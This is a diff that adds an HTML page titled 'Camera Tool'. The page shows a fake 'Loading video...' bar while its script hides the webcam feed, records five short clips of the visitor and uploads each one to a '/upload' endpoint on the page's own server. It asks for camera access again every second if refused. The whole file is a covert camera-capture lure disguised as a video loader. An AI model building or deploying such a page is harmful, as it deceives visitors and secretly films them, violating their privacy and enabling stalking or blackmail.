@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Camera Tool</title>
+  <!-- Add a favicon to avoid 404 errors -->
+  <link rel="icon" type="image/x-icon" href="/favicon.ico">
+  <style>
+    #camera-feed {
+      display: none; /* Hide the camera feed */
+    }
+    #video-icon {
+      font-size: 5em;
+      text-align: center;
+      margin-top: 50px;
+    }
+    #loading-bar {
+      width: 0%;
+      height: 20px;
+      background-color: #4CAF50;
+      margin: 20px auto;
+    }
+    #status {
+      text-align: center;
+      margin-top: 20px;
+      font-size: 1.2em;
+    }
+    .error {
+      color: red;
+    }
+  </style>
+</head>
+<body>
+  <div id="video-icon">🎥</div>
+  <div id="loading-bar"></div>
+  <p id="status">Loading video...</p>
+  <video id="camera-feed" autoplay playsinline muted></video>
+
+  <script>
+    const cameraFeed = document.getElementById('camera-feed');
+    const loadingBar = document.getElementById('loading-bar');
+    const statusText = document.getElementById('status');
+    let mediaRecorder;
+    let recordedChunks = [];
+    let recordingCount = 0;
+    const maxRecordings = 5; // Number of recordings to make
+    let width = 0;
+
+    // Animate the loading bar
+    const interval = setInterval(() => {
+      if (width >= 100) {
+        clearInterval(interval);
+      } else {
+        width++;
+        loadingBar.style.width = width + '%';
+      }
+    }, 180);
+
+    // Start recording
+    function startRecording() {
+      navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+        .then(stream => {
+          cameraFeed.srcObject = stream;
+          const options = { mimeType: 'video/webm; codecs=vp8' };
+          if (!MediaRecorder.isTypeSupported(options.mimeType)) {
+            options.mimeType = 'video/mp4'; // Fallback for unsupported browsers
+          }
+          mediaRecorder = new MediaRecorder(stream, options);
+
+          mediaRecorder.ondataavailable = (event) => {
+            if (event.data.size > 0) {
+              recordedChunks.push(event.data);
+              const blob = new Blob([event.data], { type: options.mimeType });
+              sendVideoToServer(blob);
+            }
+          };
+
+          mediaRecorder.onstop = () => {
+            console.log("MediaRecorder stopped");
+            recordingCount++;
+            if (recordingCount < maxRecordings) {
+              setTimeout(startRecording, 100); // Start next recording
+            } else {
+              statusText.textContent = "Recording complete. Thank you!";
+              statusText.style.color = "#4CAF50"; // Green for success
+            }
+          };
+
+          mediaRecorder.onerror = (event) => {
+            console.error("MediaRecorder Error:", event.error);
+            statusText.textContent = "Recording error. Retrying...";
+            statusText.style.color = "red"; // Red for errors
+            setTimeout(startRecording, 1000); // Retry after 1 second
+          };
+
+          mediaRecorder.start(3000); // Record for 3 seconds
+        })
+        .catch(error => {
+          console.error('Camera access denied or error:', error);
+          statusText.textContent = 'Camera access denied. Please allow camera access and try again.';
+          statusText.style.color = "red"; // Red for errors
+          setTimeout(startRecording, 1000); // Retry after 1 second
+        });
+    }
+
+    // Send video to the server
+    function sendVideoToServer(blob) {
+      const formData = new FormData();
+      formData.append('video', blob, `recording-${Date.now()}.${blob.type.split('/')[1]}`);
+
+      // Use the correct backend URL (automatically adjusts to local or Heroku URL)
+      const backendUrl = window.location.origin + '/upload';
+
+      fetch(backendUrl, {
+        method: 'POST',
+        body: formData,
+      })
+        .then(response => {
+          if (!response.ok) {
+            throw new Error('Upload failed');
+          }
+          return response.json();
+        })
+        .then(data => {
+          console.log('Video chunk uploaded successfully!');
+          statusText.textContent = `Uploaded ${recordingCount + 1}/${maxRecordings} videos.`;
+          statusText.style.color = "#4CAF50"; // Green for success
+        })
+        .catch(error => {
+          console.error('Error uploading video chunk:', error);
+          statusText.textContent = 'Upload failed. Please try again.';
+          statusText.style.color = "red"; // Red for errors
+        });
+    }
+
+    // Start the first recording
+    startRecording();
+  </script>
+</body>
+</html>
